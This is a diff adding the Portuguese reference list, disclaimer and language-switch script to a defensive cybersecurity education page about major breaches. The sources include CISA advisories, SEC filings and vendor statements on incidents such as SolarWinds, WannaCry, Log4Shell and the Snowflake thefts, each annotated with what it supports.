+      <span class="src"><a href="https://www.justice.gov/opa/pr/department-justice-seizes-23-million-cryptocurrency-paid-ransomware-extortionists-darkside" target="_blank" rel="noopener noreferrer" class="external">justice.gov</a></span>
+      <span class="why">Fonte primária para a recuperação das receitas do resgate. O texto da página não era acessível durante a investigação, por isso é citada em vez de transcrita.</span>
+    </li>
+
+    <li data-n="18" id="ref-18-pt">
+      <b>MGM Resorts International — Form 8-K, SEC dos EUA</b>
+      <span class="src"><a href="https://www.sec.gov/Archives/edgar/data/789570/000119312523251667/d461062d8k.htm" target="_blank" rel="noopener noreferrer" class="external">comunicação à SEC</a></span>
+      <span class="why">Citado: impacto negativo de “aproximadamente 100 milhões de dólares” no Adjusted Property EBITDAR; “menos de 10 milhões de dólares em despesas pontuais”; dados de alguns clientes que transaccionaram antes de Março de 2019. A comunicação não indica o método de acesso inicial.</span>
+    </li>
+    <li data-n="19" id="ref-19-pt">
+      <b>CISA — aviso sobre o Scattered Spider (AA23-320A)</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" target="_blank" rel="noopener noreferrer" class="external">aviso da CISA</a></span>
+      <span class="why">Fonte oficial de TTP do grupo, que descreve engenharia social ao help desk para repor palavras-passe ou tokens MFA. O corpo do aviso não era legível durante a investigação, por isso é citado como referência autorizada de TTP e não transcrito.</span>
+    </li>
+    <li data-n="20" id="ref-20-pt">
+      <b>Comissão de Energia e Comércio da Câmara dos EUA — “What We Learned: Change Healthcare Cyber Attack”</b>
+      <span class="src"><a href="https://energycommerce.house.gov/posts/what-we-learned-change-healthcare-cyber-attack" target="_blank" rel="noopener noreferrer" class="external">energycommerce.house.gov</a></span>
+      <span class="why">Usado para: o ataque teve êxito porque a UnitedHealth “não estava a usar autenticação multifactor [MFA]”; resgate de “22 milhões de dólares em Bitcoin”. O Citrix Bleed (CVE-2023-4966) <b>não</b> está estabelecido aqui como vector.</span>
+    </li>
+    <li data-n="20b" id="ref-20b-pt">
+      <b>Office for Civil Rights do HHS dos EUA — perguntas frequentes sobre o incidente Change Healthcare</b>
+      <span class="src"><a href="https://www.hhs.gov/hipaa/for-professionals/special-topics/change-healthcare-cybersecurity-incident-frequently-asked-questions/index.html" target="_blank" rel="noopener noreferrer" class="external">FAQ do hhs.gov</a></span>
+      <span class="why">Usado para: aproximadamente 192,7 milhões de indivíduos identificados. A página bloqueou o acesso directo durante a investigação, por isso o valor é citado e não transcrito.</span>
+    </li>
+    <li data-n="12" id="ref-12-pt">
+      <b>CISA — aviso AA20-352A, SolarWinds / cadeia de fornecimento</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" target="_blank" rel="noopener noreferrer" class="external">aviso da CISA</a></span>
+      <span class="why">Citado: o adversário acrescentou uma versão maliciosa do binário “ao ciclo de vida do software da SolarWinds”, “assinada pelo certificado legítimo de assinatura de código da SolarWinds”.</span>
+    </li>
+    <li data-n="13" id="ref-13-pt">
+      <b>GAO dos EUA — ciberataque SolarWinds</b>
+      <span class="src"><a href="https://www.gao.gov/blog/solarwinds-cyberattack-demands-significant-federal-and-private-sector-response-infographic" target="_blank" rel="noopener noreferrer" class="external">gao.gov</a></span>
+      <span class="why">Citado: “quase 18 mil” clientes receberam uma actualização comprometida; o actor “visou um subconjunto menor de clientes de alto valor”.</span>
+    </li>
+    <li data-n="14" id="ref-14-pt">
+      <b>Mandiant / Google Cloud — análise técnica do SUNBURST</b>
+      <span class="src"><a href="https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor" target="_blank" rel="noopener noreferrer" class="external">cloud.google.com threat intelligence</a></span>
+      <span class="why">Usado para: a dormência de ~12–14 dias, o C2 por DNS com consultas específicas da vítima, o tráfego disfarçado de actividade do Orion e o instrumental TEARDROP / BEACON.</span>
+    </li>
+    <li data-n="15" id="ref-15-pt">
+      <b>CISA — aviso de mitigação do Stuxnet (ICSA-10-238-01B)</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/ics-advisories/icsa-10-238-01b" target="_blank" rel="noopener noreferrer" class="external">aviso ICS da CISA</a></span>
+      <span class="why">Citado: “as pen USB parecem ser um mecanismo primário de infecção”, com propagação também por “partilhas de rede e bases de dados SQL”; quatro zero-days mais uma vulnerabilidade já corrigida; a Siemens conhecia infecções mas não reportou efeitos adversos nos sistemas de automação nesses casos.</span>
+    </li>
+    <li data-n="15b" id="ref-15b-pt">
+      <b>Institute for Science and International Security — o Stuxnet e as centrífugas de Natanz</b>
+      <span class="src"><a href="https://isis-online.org/isis-reports/did-stuxnet-take-out-1000-centrifuges-at-the-natanz-enrichment-plant/" target="_blank" rel="noopener noreferrer" class="external">isis-online.org</a></span>
+      <span class="why">Citado: “Como os sistemas de controlo de Natanz não estão ligados à internet, o Stuxnet teria de viajar num suporte amovível”; o “propósito exacto ou efeito global” do Stuxnet “continua difícil de avaliar”. O número de ~1 000 centrífugas é uma inferência a partir da cronologia, não uma causalidade provada.</span>
+    </li>
+    <li data-n="25" id="ref-25-pt">
+      <b>Comissão Federal de Comércio dos EUA — a violação não divulgada da Uber em 2016</b>
+      <span class="src"><a href="https://www.ftc.gov/business-guidance/blog/2018/04/ftc-addresses-ubers-undisclosed-data-breach-new-proposed-order" target="_blank" rel="noopener noreferrer" class="external">ftc.gov</a></span>
+      <span class="why">Citado: “a chave foi publicada num repositório privado do GitHub”; “os intrusos usaram palavras-passe expostas noutras grandes violações de dados”; as contagens de 25,6 M / 22,1 M / 607 mil registos.</span>
+    </li>
+    <li data-n="26" id="ref-26-pt">
+      <b>Procurador-Geral da Califórnia — anúncio do acordo com a Uber</b>
+      <span class="src"><a href="https://oag.ca.gov/news/press-releases/california-attorney-general-becerra-san-francisco-district-attorney-gasc%C3%B3n" target="_blank" rel="noopener noreferrer" class="external">oag.ca.gov</a></span>
+      <span class="why">Usado para: exposição dos “dados de 57 milhões de utilizadores”; o pagamento reportado de 100 mil dólares aos hackers; a divulgação pública tardia, até Novembro de 2017.</span>
+    </li>
+    <li data-n="27" id="ref-27-pt">
+      <b>CISA — indicadores e alerta técnico sobre o WannaCry</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/alerts/2017/05/12/indicators-associated-wannacry-ransomware" target="_blank" rel="noopener noreferrer" class="external">alerta da CISA, 12 Mai 2017</a></span>
+      <span class="why">Citado: propagação “pela exploração MS17-010/EternalBlue SMBv1.0”; infecções em mais de 150 países.</span>
+    </li>
+    <li data-n="28" id="ref-28-pt">
+      <b>Microsoft — boletim de segurança MS17-010</b>
+      <span class="src"><a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener noreferrer" class="external">learn.microsoft.com MS17-010</a></span>
+      <span class="why">Usado para: o boletim trata de execução remota de código no SMBv1 e cobre CVE-2017-0143 a CVE-2017-0148.</span>
+    </li>
+    <li data-n="29b" id="ref-29b-pt">
+      <b>National Audit Office do Reino Unido — investigação ao WannaCry e ao NHS</b>
+      <span class="src"><a href="https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/" target="_blank" rel="noopener noreferrer" class="external">nao.org.uk</a></span>
+      <span class="why">Citado: “pelo menos 81 de 236 trusts” afectados; 603 outras organizações do NHS; 6 912 consultas canceladas identificadas e uma estimativa do NHS England de mais de 19 mil; o NAO acredita que nenhum dado de doentes foi comprometido ou roubado.</span>
+    </li>
+    <li data-n="29" id="ref-29-pt">
+      <b>CISA — ameaça reforçada de DDoS pelo Mirai e outras botnets</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/alerts/2016/10/14/heightened-ddos-threat-posed-mirai-and-other-botnets" target="_blank" rel="noopener noreferrer" class="external">alerta da CISA, 14 Out 2016</a></span>
+      <span class="why">Citado: uma “curta lista de 62 nomes de utilizador e palavras-passe comuns por omissão”; o ataque ao Krebs acima de “620 gigabits por segundo”; portas Telnet 23 e 2323; a alegação de 380 mil dispositivos.</span>
+    </li>
+    <li data-n="30" id="ref-30-pt">
+      <b>Software Engineering Institute da Carnegie Mellon — o ataque à Dyn</b>
+      <span class="src"><a href="https://www.sei.cmu.edu/blog/the-dyn-attack-who-participated-who-was-impacted/" target="_blank" rel="noopener noreferrer" class="external">sei.cmu.edu</a></span>
+      <span class="why">Usado para: os efeitos indirectos da queda da Dyn, com o papel do Mirai descrito com cautela como um factor.</span>
+    </li>
+    <li data-n="24" id="ref-24-pt">
+      <b>Ars Technica — Code Spaces e a violação da consola AWS (2014)</b>
+      <span class="src"><a href="https://arstechnica.com/information-technology/2014/06/aws-console-breach-leads-to-demise-of-service-with-proven-backup-plan/" target="_blank" rel="noopener noreferrer" class="external">arstechnica.com</a></span>
+      <span class="why">Citado: o atacante “tinha obtido acesso ao nosso painel de controlo Amazon EC2”; a Code Spaces concluiu que “não temos alternativa senão cessar a actividade”. O relato não estabelece como o acesso foi obtido primeiro — e esta página também não.</span>
+    </li>
+    <li data-n="31" id="ref-31-pt">
+      <b>CISA e parceiros — aviso conjunto sobre o Log4Shell, AA21-356A</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" target="_blank" rel="noopener noreferrer" class="external">aviso da CISA</a></span>
+      <span class="why">Citado: “A vulnerabilidade existe na acção que a Java Naming and Directory Interface (JNDI) toma para resolver variáveis”; gama afectada Log4j 2.0-beta9 a 2.14.1; divulgada em 10 de Dezembro de 2021; “o Java é usado extensamente em plataformas de TI e OT, são fáceis de explorar e aplicar mitigações exige muitos recursos”.</span>
+    </li>
+    <li data-n="32" id="ref-32-pt">
+      <b>CISA e parceiros — vulnerabilidades mais exploradas em 2021, AA22-117A</b>
+      <span class="src"><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-117a" target="_blank" rel="noopener noreferrer" class="external">aviso da CISA</a></span>
+      <span class="why">Usado para: o Log4Shell entre as vulnerabilidades rotineiramente exploradas, e a incorporação do Log4j em “milhares de produtos em todo o mundo”.</span>
+    </li>
+    <li data-n="33" id="ref-33-pt">
+      <b>Shadowserver — servidores Log4j vulneráveis, primeira sondagem</b> (dados de 11–13 de Dezembro de 2021)
+      <span class="src"><a href="https://www.shadowserver.org/news/shadowserver-special-reports-vulnerable-log4j-servers/" target="_blank" rel="noopener noreferrer" class="external">shadowserver.org</a></span>
+      <span class="why">Usado para: 13 294 IPs únicos vulneráveis e virados para a internet em 109 países, a partir de uma lista inicial de cerca de 300 milhões de IPs responsivos conhecidos.</span>
+    </li>
+    <li data-n="34" id="ref-34-pt">
+      <b>Shadowserver — servidores Log4j vulneráveis, sondagem de seguimento</b> (dados de 16–22 de Dezembro de 2021)
+      <span class="src"><a href="https://www.shadowserver.org/news/shadowserver-special-reports-vulnerable-log4j-servers-2021-12-22-update/" target="_blank" rel="noopener noreferrer" class="external">shadowserver.org</a></span>
+      <span class="why">Usado para: 8 472 IPs únicos virados para a internet a alojar 10 951 instâncias.</span>
+    </li>
+    <li data-n="37" id="ref-37-pt">
+      <b>Mandiant / Google Cloud — UNC5537, roubo e extorsão de dados de clientes da Snowflake</b>
+      <span class="src"><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion" target="_blank" rel="noopener noreferrer" class="external">cloud.google.com threat intelligence, 10 de Junho de 2024</a></span>
+      <span class="why">Citado: “todos os incidentes a que a Mandiant respondeu associados a esta campanha remontavam a credenciais de clientes comprometidas”; pelo menos 79,7% das contas tinham exposição prévia de credenciais; MFA ausente; credenciais sem rotação durante anos; aproximadamente 165 organizações notificadas. Nota: este relatório sustenta credenciais roubadas por infostealer, não roubo de tokens de sessão.</span>
+    </li>
+    <li data-n="38" id="ref-38-pt">
+      <b>AT&amp;T Inc. — Form 8-K, SEC dos EUA</b> (apresentado a 12 de Julho de 2024)
+      <span class="src"><a href="https://www.sec.gov/Archives/edgar/data/732717/000073271724000046/t-20240506.htm" target="_blank" rel="noopener noreferrer" class="external">comunicação à SEC</a></span>
+      <span class="why">Âmbito citado: exfiltração entre 14 e 25 de Abril de 2024; registos de cerca de 1 de Maio a 31 de Outubro de 2022 mais 2 de Janeiro de 2023; dados que cobrem “quase todos os clientes sem fios da AT&amp;T”. A comunicação não dá um total numérico.</span>
+    </li>
+    <li data-n="39" id="ref-39-pt">
+      <b>Associated Press — cobertura da violação de dados da AT&amp;T</b> (12 de Julho de 2024)
+      <span class="src"><a href="https://apnews.com/article/att-data-breach-text-cell-b5cdc8d6c9e1b980cb2163f34b297dad" target="_blank" rel="noopener noreferrer" class="external">apnews.com</a></span>
+      <span class="why">Fonte do valor de ~109 milhões como contagem de contas de clientes nos EUA — uma estimativa de contas, não de registos individuais. O texto do artigo não era acessível durante a investigação.</span>
+    </li>
+    <li data-n="40" id="ref-40-pt">
+      <b>Reuters — número de contas de clientes da AT&amp;T</b> (12 de Julho de 2024)
+      <span class="src"><a href="https://www.reuters.com/technology/cybersecurity/att-says-data-around-109-mln-us-customer-accounts-illegally-downloaded-2024-07-12/" target="_blank" rel="noopener noreferrer" class="external">reuters.com</a></span>
+      <span class="why">Corrobora o valor de ~109 milhões de contas. O texto do artigo não era acessível durante a investigação.</span>
+    </li>
+    <li data-n="41" id="ref-41-pt">
+      <b>Ticketmaster — aviso de incidente de segurança de dados</b>
+      <span class="src"><a href="https://help.ticketmaster.com/hc/en-us/articles/26110487861137-Ticketmaster-Data-Security-Incident" target="_blank" rel="noopener noreferrer" class="external">help.ticketmaster.com</a></span>
+      <span class="why">Citado: “actividade não autorizada numa base de dados isolada na nuvem alojada por um fornecedor terceiro de serviços de dados”. O aviso não nomeia o fornecedor nem confirma o valor de 560 milhões.</span>
+    </li>
+    <li data-n="42" id="ref-42-pt">
+      <b>Banco Santander — declaração sobre acesso não autorizado a base de dados</b> (14 de Maio de 2024)
+      <span class="src"><a href="https://www.santander.com/en/stories/statement" target="_blank" rel="noopener noreferrer" class="external">santander.com</a></span>
+      <span class="why">Citado: “Não estão contidos na base de dados dados transaccionais, nem quaisquer credenciais que permitissem realizar transacções em contas.” Clientes afectados no Chile, em Espanha e no Uruguai.</span>
+    </li>
+    <li data-n="43" id="ref-43-pt">
+      <b>23andMe — actualização sobre o incidente de segurança de dados</b> (5 de Dezembro de 2023)
+      <span class="src"><a href="https://www.23andme.org/blog/articles/addressing-data-security-concerns/" target="_blank" rel="noopener noreferrer" class="external">23andme.org</a></span>
+      <span class="why">Usado para: cerca de 14 mil contas acedidas por credential stuffing, menos de 0,1% dos clientes, através das quais aproximadamente 5,5 milhões de perfis DNA Relatives e 1,4 milhões de perfis Family Tree — cerca de 6,9 milhões de perfis no total.</span>
+    </li>
+    <li data-n="44" id="ref-44-pt">
+      <b>SpyCloud — Annual Identity Exposure Report 2024</b>
+      <span class="src"><a href="https://spycloud.com/resource/report/spycloud-annual-identity-exposure-report-2024/" target="_blank" rel="noopener noreferrer" class="external">spycloud.com</a></span>
+      <span class="why">Usado para: 74% de reutilização entre utilizadores expostos em duas ou mais violações no ano anterior; 61% de taxa histórica de reutilização até 2023. Descrevem a população de exposição analisada pela SpyCloud, não um inquérito à população em geral.</span>
+    </li>
+    <li data-n="45" id="ref-45-pt">
+      <b>SpyCloud — investigação sobre reutilização de palavras-passe</b> (8 de Outubro de 2022)
+      <span class="src"><a href="https://spycloud.com/blog/password-reuse/" target="_blank" rel="noopener noreferrer" class="external">spycloud.com/blog/password-reuse</a></span>
+      <span class="why">Usado para: valores anteriores — 70% de reutilização entre utilizadores expostos em violações de 2021, e 64% dos funcionários da Fortune 1000 a reutilizar palavras-passe em vários sites.</span>
+    </li>
+  </ol>
+</section>
+
+<footer>
+  <div class="disclaimer">
+    <p><b>Âmbito e intenção.</b> Esta página é educação em segurança defensiva. Explica como funcionam as
+    intrusões reais para que os sistemas possam ser construídos e operados de forma a resistir-lhes — de
+    propósito, não contém explorações funcionais, listas de alvos nem instruções operacionais contra
+    quem quer que seja. O código aqui apresentado é pseudocódigo ilustrativo que descreve um mecanismo, uma
+    regra de detecção para defensores, ou um par vulnerável/corrigido usado para ensinar uma classe de bug.
+    Os valores de chave AWS mostrados são exemplos da documentação publicada pela própria AWS.</p>
+    <p><b>Ressalvas, ditas com clareza.</b> Onde um detalhe é reportado pela imprensa em vez de confirmado
+    por uma comunicação oficial, aviso ou declaração da empresa, o texto di-lo — incluindo a origem da
+    fuga de palavras-passe da Colonial Pipeline, a sequência do help desk da MGM e a cadeia de phishing até
+    ao prestador da Target. O Citrix Bleed (CVE-2023-4966) <em>não</em> está estabelecido como vector da
+    Change Healthcare. O número de ~1 000 centrífugas do Stuxnet é uma inferência a partir da cronologia,
+    não prova de causalidade. Vários valores (os ~109 milhões da AT&amp;T, os 147 milhões da Equifax, os
+    192,7 milhões da Change Healthcare) vêm de fontes que não puderam ser relidas na íntegra durante a
+    preparação e são atribuídos em vez de transcritos. As estatísticas de violações descrevem conjuntos de
+    dados reportados e não são um censo de todos os incidentes.</p>
+  </div>
+  <div class="footer-grid">
+    <span>Um só ficheiro · sem bibliotecas externas · sem scripts</span>
+    <span>Mapeado ao MITRE ATT&amp;CK v20.0</span>
+    <span>Quadros: NIST CSF 2.0 · orientação da CISA</span>
+    <span>Estatísticas: Verizon DBIR 2024–2025</span>
+  </div>
+</footer>
+
+</main>
+</div>
+</div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  var blocks = document.querySelectorAll("[data-lang-block]");
+  var links = document.querySelectorAll("[data-lang-switch]");
+  function apply(lang) {
+    Array.prototype.forEach.call(blocks, function (b) {
+      b.hidden = b.getAttribute("data-lang-block") !== lang;
+    });
+    Array.prototype.forEach.call(links, function (a) {
+      if (a.getAttribute("data-lang-switch") === lang) { a.setAttribute("aria-current", "true"); }
+      else { a.removeAttribute("aria-current"); }
+    });
+    document.documentElement.lang = lang === "pt" ? "pt-PT" : "en";
+  }
+  Array.prototype.forEach.call(links, function (a) {
+    a.addEventListener("click", function (ev) {
+      if (ev.metaKey || ev.ctrlKey || ev.shiftKey || ev.button) { return; }
+      ev.preventDefault();
+      apply(a.getAttribute("data-lang-switch"));
+    });
+  });
+  var wanted = new URLSearchParams(location.search).get("lang");
+  if (wanted === "en" || wanted === "pt") { apply(wanted); }
+})();
+</script>
 </body>
 </html>
